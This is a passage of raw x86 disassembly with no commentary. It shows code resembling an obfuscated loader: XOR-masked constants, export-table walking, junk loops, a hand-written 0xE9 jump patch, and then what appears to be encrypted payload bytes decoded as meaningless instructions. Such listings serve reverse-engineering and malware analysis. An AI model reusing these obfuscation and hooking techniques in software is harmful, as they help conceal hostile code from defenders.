  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0xe2164425
  4056ec:	js     0x4056c1
  4056ee:	pop    edi
  4056ef:	jl     0x40576d
  4056f1:	dec    edx
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	or     al,0x5e
  4056f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056f8:	ret    
  4056f9:	mov    eax,ds:0x13e82f1
  4056fe:	ins    BYTE PTR es:[edi],dx
  4056ff:	cli    
  405700:	cmp    al,0xf3
  405702:	cmp    al,BYTE PTR ds:0xdc0c7e5a
  405708:	inc    ebp
  405709:	lock inc ecx
  40570b:	repz jmp 0x40576e
  40570e:	jb     0x405716
  405710:	repz retf 0x84f0
  405714:	call   0x4cca:0x9c75b235
  40571b:	adc    DWORD PTR [ebp+0x45a275e0],ecx
  405721:	push   edx
  405722:	and    bl,BYTE PTR [ebp-0x64]
  405725:	fdivr  QWORD PTR [eax-0x79]
  405728:	dec    esp
  405729:	inc    ebx
  40572a:	jns    0x4056b6
  40572c:	lds    edx,FWORD PTR [edx]
  40572e:	mov    edx,0xd8c39230
  405733:	mov    edi,0x92cc6f36
  405738:	jae    0x405797
  40573a:	inc    ebp
  40573b:	aas    
  40573c:	xor    bh,0x50
  40573f:	xor    bh,BYTE PTR [ecx-0x46]
  405742:	xor    eax,0x20d51ec5
  405747:	pusha  
  405748:	sub    DWORD PTR [eax-0x4],edi
  40574b:	adc    ah,dl
  40574d:	mov    bh,0x83
  40574f:	pusha  
  405750:	fiadd  DWORD PTR [eax-0x4ac513bd]
  405756:	add    al,0xe8
  405758:	push   ss
  405759:	fdivp  st(6),st
  40575b:	repz pop edx
  40575d:	mov    ah,BYTE PTR ds:0xc30bf95d
  405763:	out    0xed,al
  405765:	jge    0x405775
  405767:	ins    BYTE PTR es:[edi],dx
  405768:	dec    ecx
  405769:	pop    es
  40576a:	jo     0x4057bb
  40576c:	lea    esp,[edx+0x235f1dd2]
  405772:	(bad)  
  405773:	pop    ss
  405774:	stos   BYTE PTR es:[edi],al
  405775:	sar    BYTE PTR [edx+0x72],1
  405778:	popf   
  405779:	or     BYTE PTR [edx-0x2a6a1aee],cl
  40577f:	repz fstp QWORD PTR ds:[esp+edx*2+0x63]
  405785:	mov    al,ds:0x94eb24dd
  40578a:	fstp   DWORD PTR [ecx+0x41]
  40578d:	cs mov ebx,0x94472853
  405793:	and    BYTE PTR [ecx],0xb1
  405796:	popf   
  405797:	dec    eax
  405798:	lea    esi,[ecx+0x6c]
  40579b:	cld    
  40579c:	inc    ebx
  40579d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40579e:	icebp  
  40579f:	push   ss
  4057a0:	pop    es
  4057a1:	xor    eax,0xf1c2c76f
  4057a6:	mov    cl,0x77
  4057a8:	sub    eax,0x5bdd4f05
  4057ad:	shl    BYTE PTR [ebx+eiz*4+0x77],0xca
  4057b2:	and    edi,DWORD PTR [edi-0x2c6c315d]
  4057b8:	ja     0x405811
  4057ba:	in     eax,0xb3
  4057bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057bd:	(bad)  
  4057be:	lock adc al,0xd6
  4057c1:	stos   DWORD PTR es:[edi],eax
  4057c2:	dec    ecx
  4057c3:	jns    0x4057da
  4057c5:	push   esp
  4057c6:	sahf   
  4057c7:	std    
  4057c8:	add    bl,BYTE PTR [eax]
  4057ca:	and    bh,dl
  4057cc:	push   eax
  4057cd:	xor    cl,ah
  4057cf:	pop    esp
  4057d0:	int3   
  4057d1:	out    dx,al
  4057d2:	stc    
  4057d3:	mov    edi,0xe0d21dd1
  4057d8:	add    edi,DWORD PTR [esi]
  4057da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057dc:	mov    dh,0x91
  4057de:	mov    eax,0xf402afb1
  4057e3:	adc    al,0x41
  4057e5:	add    ah,bl
  4057e7:	jp     0x40581b
  4057e9:	bound  ebp,QWORD PTR [edi-0x2d]
  4057ec:	dec    esi
  4057ed:	imul   edx,esi,0x90153a
  4057f3:	data16 fisub WORD PTR [edx+ecx*8+0x4c62e15]
  4057fb:	sahf   
  4057fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057fd:	jmp    FWORD PTR [esi]
  4057ff:	cli    
  405800:	push   ebx
  405801:	pop    edi
  405802:	sub    eax,0xd1ca98bb
  405807:	dec    ebx
  405808:	int3   
  405809:	shr    BYTE PTR [edi-0x64],0x75
  40580d:	(bad)  
  40580e:	push   0x8a0009bc
  405813:	jl     0x40579b
  405815:	sbb    ebx,DWORD PTR [edi-0x1f]
  405818:	(bad)  
  405819:	ror    DWORD PTR [ebx+edx*4-0x58],1
  40581d:	dec    ebx
  40581e:	mov    al,ds:0x302d9f05
  405823:	sub    bh,bl
  405825:	push   edi
  405826:	bound  esi,QWORD PTR [esi-0x77]
  405829:	push   ecx
  40582a:	ss clc 
  40582c:	jmp    0xfe9d167a
  405831:	outs   dx,DWORD PTR ds:[esi]
  405833:	popf   
  405834:	adc    esp,ebx
  405836:	or     BYTE PTR [eax],bh
  405838:	mov    DWORD PTR [edx],edx
  40583a:	mov    ds:0xf0998294,ax
  405840:	cdq    
  405841:	inc    eax
  405842:	mov    ebp,0x895b37ce
  405847:	retf   0xc038
  40584a:	add    bl,BYTE PTR [esi]
  40584c:	loope  0x4057da
  40584e:	push   ss
  40584f:	sti    
  405850:	dec    ebp
  405851:	es ins BYTE PTR es:[edi],dx
  405853:	shr    DWORD PTR [eax+0xacfd2ac],0x37
  40585a:	or     ch,BYTE PTR [ebp-0x1c]
  40585d:	sbb    ah,al
  40585f:	test   DWORD PTR cs:[esi],eax
  405862:	ficomp DWORD PTR [ecx]
  405864:	scas   al,BYTE PTR es:[edi]
  405865:	cmp    DWORD PTR [eax],0xdc8e69c
  40586b:	sbb    BYTE PTR [ebx+eiz*8],bh
  40586e:	(bad)  
  40586f:	and    ch,bl
  405871:	sub    ebx,ecx
  405873:	inc    ebx
  405874:	mov    ebp,0xded24580
  405879:	push   esp
  40587a:	add    al,0xca
  40587c:	jmp    0xf92b:0xc2ebd2f6
  405883:	pop    es
  405884:	pop    ebp
  405885:	fist   DWORD PTR [ebx+0x44]
  405888:	pop    ebx
  405889:	jecxz  0x405842
  40588b:	xchg   esi,eax
  40588c:	lds    eax,FWORD PTR [ebp-0x663fbc4]
  405892:	push   ss
  405893:	out    0x20,eax
  405895:	dec    ecx
  405896:	pop    ecx
  405897:	(bad)  
  405898:	cmovb  esi,DWORD PTR [edi]
  40589b:	out    0xea,eax
  40589d:	mov    ?,WORD PTR [esi-0x5bfdda06]
  4058a3:	shl    DWORD PTR [ecx],0x91
  4058a6:	fdiv   QWORD PTR [edx-0x6]
  4058a9:	hlt    
  4058aa:	xlat   BYTE PTR ds:[ebx]
  4058ab:	bound  edi,QWORD PTR [edi-0x1d033f79]
  4058b1:	mov    ds:0x56f7b368,al
  4058b6:	add    eax,0x424d94ce
  4058bb:	lods   al,BYTE PTR ds:[esi]
  4058bc:	xor    esi,esp
  4058be:	sub    ecx,DWORD PTR [esi]
  4058c0:	pop    eax
  4058c1:	pop    esi
  4058c2:	or     ax,WORD PTR [edi-0x5e37373c]
  4058c9:	sub    edi,DWORD PTR [edi-0xd]
  4058cc:	ret    0xcbcb
  4058cf:	sbb    eax,0x7d5d4282
  4058d4:	aam    0x3a
  4058d6:	mov    eax,0x4563fa36
  4058db:	inc    edi
  4058dc:	mov    esp,0x98c8b06e
  4058e1:	ror    BYTE PTR [eax+0x4c600848],1
  4058e7:	add    eax,0x33ee96ec
  4058ec:	inc    ecx
  4058ed:	sar    DWORD PTR [edx+0x1dae5e9b],1
  4058f3:	sub    dh,BYTE PTR [ecx-0x6f591a57]
  4058f9:	int3   
  4058fa:	popf   
  4058fb:	lods   al,BYTE PTR ds:[esi]
  4058fc:	sub    eax,0x88eeefe2
  405901:	or     eax,0xd3f13c3d
  405906:	xlat   BYTE PTR ds:[ebx]
  405907:	bound  ecx,QWORD PTR [esi+0x49fe9f9c]
  40590d:	sbb    eax,0xe03db0a5
  405912:	pop    ss
  405913:	bound  ecx,QWORD PTR [eax]
  405915:	sub    dl,dl
  405917:	pusha  
  405918:	sbb    ah,al
  40591a:	and    ebx,ecx
  40591c:	jg     0x4058bc
  40591e:	sub    eax,0xca0dd8f7
  405923:	cmp    eax,0xdc22d9a7
  405928:	add    cl,BYTE PTR [ebp-0x2f420997]
  40592e:	pop    es
  40592f:	inc    ebx
  405930:	sub    bh,dl
  405932:	clc    
  405933:	xchg   BYTE PTR [edi-0x66],cl
  405936:	mov    eax,ds:0x20979855
  40593b:	pop    ss
  40593c:	in     al,dx
  40593d:	cmp    eax,0xe516302c
  405942:	or     eax,0x9cddef26
  405947:	jmp    0xacc02f96
  40594c:	jnp    0x4058f7
  40594e:	ret    
  40594f:	mov    cl,0xe5
  405951:	pop    edx
  405952:	sti    
  405953:	outs   dx,DWORD PTR ds:[esi]
  405954:	(bad)  
  405955:	outs   dx,DWORD PTR ds:[esi]
  405956:	mov    eax,ds:0xb00d2319
  40595b:	cmp    cl,BYTE PTR [esi+0x6]
  40595e:	neg    esp
  405960:	sub    ebp,DWORD PTR [eax]
  405962:	jmp    0x39ca9e79
  405967:	sub    al,0x51
  405969:	inc    eax
  40596a:	cs retf 
  40596c:	arpl   WORD PTR [ebp+0xcb9b4a9],bp
  405972:	cli    
  405973:	push   ebp
  405974:	lods   al,BYTE PTR ds:[esi]
  405975:	jle    0x405988
  405977:	hlt    
  405978:	add    BYTE PTR [eax+0x1f],ch
  40597b:	xchg   esi,eax
  40597c:	daa    
  40597d:	pop    eax
  40597e:	mov    ah,0x5c
  405980:	jns    0x405956
  405982:	jmp    0x4059cf
  405984:	adc    DWORD PTR [eax],edi
  405986:	pop    edi
  405987:	pop    es
  405988:	push   ebp
  405989:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40598b:	cmp    DWORD PTR [ebx-0x22cf787b],eax
  405991:	in     al,0x16
  405993:	cdq    
  405994:	add    eax,0x6a8668bd
  405999:	int3   
  40599a:	jle    0x40595c
  40599c:	shr    DWORD PTR [eax-0x3a3bafb1],cl
  4059a2:	imul   edx,DWORD PTR [ebp-0x4d],0xffffff90
  4059a6:	in     eax,0x1a
  4059a8:	mov    ebp,0x898066c
  4059ad:	test   eax,0x1f7c3910
  4059b2:	mov    edx,0xae2943f6
  4059b7:	cmp    dh,BYTE PTR [ebx-0x4a]
  4059ba:	(bad)  
  4059bb:	ror    BYTE PTR [ebx-0x40ae942b],cl
  4059c1:	sar    edi,cl
  4059c3:	sar    ah,cl
  4059c5:	ret    
  4059c6:	jb     0x4059cf
  4059c8:	mov    ah,0xe6
  4059ca:	xchg   esi,eax
  4059cb:	adc    edi,ebp
  4059cd:	mov    bl,0x2d
  4059cf:	cmp    bl,0x86
  4059d2:	fld    QWORD PTR [ebx+0x5a3c855f]
  4059d8:	popa   
  4059d9:	xor    ebp,edx
  4059db:	(bad)  
  4059dc:	jge    0x4059c3
  4059de:	sub    ebp,DWORD PTR [eax]
  4059e0:	nop
  4059e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e2:	hlt    
  4059e3:	icebp  
  4059e4:	cmp    al,0xe
  4059e6:	push   esi
  4059e7:	jmp    0xf103:0x73ff8b9e
  4059ee:	sub    BYTE PTR [ebx],dl
  4059f0:	xchg   DWORD PTR [ecx+0x30],ecx
  4059f3:	in     eax,dx
  4059f4:	cmp    DWORD PTR [esi+0x1c03b305],eax
  4059fa:	mov    ds:0x8c173e3,al
  4059ff:	ret    0xa8ee
  405a02:	xor    cl,BYTE PTR [edx-0x38]
  405a05:	xor    eax,0x102fe638
  405a0a:	or     bh,BYTE PTR [ebp+0x5bceffd4]
  405a10:	cli    
  405a11:	addr16 sub cl,ah
  405a14:	nop
  405a15:	aam    0xca
  405a17:	pop    esp
  405a18:	scas   al,BYTE PTR es:[edi]
  405a19:	adc    eax,0x7a353fe5
  405a1e:	cdq    
  405a1f:	adc    bl,BYTE PTR [edi+0x69]
  405a22:	cmp    eax,DWORD PTR [edx+ecx*1-0x9]
  405a26:	pop    eax
  405a27:	or     eax,0xcfb373be
  405a2c:	jnp    0x405a3c
  405a2e:	gs add al,0xe
  405a31:	pop    es
  405a32:	out    dx,eax
  405a33:	enter  0xb8fb,0x95
  405a37:	add    edx,DWORD PTR [ebx+0x5a]
  405a3a:	mov    eax,DWORD PTR ds:0xdfe29e91
  405a40:	pop    ebp
  405a41:	cmp    al,0x62
  405a43:	frstor ds:0xc0240d7d
  405a49:	jae    0x405a33
  405a4b:	push   es
  405a4c:	lods   al,BYTE PTR ds:[esi]
  405a4d:	test   BYTE PTR [ebp+0x1a11e720],dh
  405a53:	cmp    edi,DWORD PTR [ecx-0x7ea2e23]
  405a59:	inc    ebx
  405a5a:	dec    esi
  405a5b:	scas   eax,DWORD PTR es:[edi]
  405a5c:	loopne 0x405a9e
  405a5e:	push   ebp
  405a5f:	cs in  eax,0x7e
  405a62:	add    bh,BYTE PTR [ecx+eax*8+0x78]
  405a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a67:	add    al,0xa2
  405a69:	pop    esp
  405a6a:	addr16 stc 
  405a6c:	and    eax,0x5bf752f3
  405a71:	leave  
  405a72:	les    eax,FWORD PTR [ecx]
